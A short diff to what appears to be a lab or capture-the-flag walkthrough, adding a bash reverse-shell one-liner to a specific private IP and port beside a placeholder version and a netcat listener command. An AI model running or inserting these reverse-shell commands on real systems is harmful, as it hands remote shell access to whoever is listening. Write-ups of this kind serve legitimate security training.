@@ -16,6 +16,7 @@ nc -lvnp 443
 
 ```bash
 bash -c "bash -i >& /dev/tcp/{YOUR_IP}/443 0>&1"
+bash -c "bash -i >& /dev/tcp/10.10.14.63/4444 0>&1"
 ```
 
 ## Back to Source Machine
